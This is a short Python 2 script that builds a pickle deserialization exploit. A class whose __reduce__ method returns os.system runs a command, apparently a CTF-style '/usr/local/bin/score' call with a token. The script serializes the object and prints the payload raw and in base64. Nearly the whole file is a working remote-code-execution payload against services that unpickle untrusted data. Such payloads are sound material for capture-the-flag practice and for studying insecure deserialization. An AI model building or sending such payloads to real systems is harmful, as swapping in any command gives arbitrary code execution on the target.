import cPickle
import os
import base64


class blah(object):
    def __reduce__(self):
        return (os.system, ("/usr/local/bin/score 35111e38-8d0e-4044-9a8f-0b622173234b ",))

b=blah()
payload = cPickle.dumps(b)
print(payload)
print(base64.b64encode(payload))